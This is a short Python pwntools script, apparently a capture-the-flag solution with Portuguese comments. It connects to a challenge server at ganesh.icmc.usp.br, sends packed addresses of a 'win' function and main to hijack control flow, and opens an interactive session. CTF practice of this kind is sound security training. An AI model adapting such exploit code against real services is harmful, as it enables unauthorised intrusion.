from pwn import *

host = 'ganesh.icmc.usp.br' 
port = 5550

io = remote(host, port) # Cria um processo remoto na variável 'io'

# Define os enderecos de cada funcao
win_addr = 0x0000000000401156
main_addr = 0x000000000040115d

payload = p64(win_addr) + p64(main_addr) # Concatena em little-endian ambos os enderecos

io.sendline(payload) # Envia o payload

io.interactive() # Cria um processo interativo (necessário para ver os resultados)
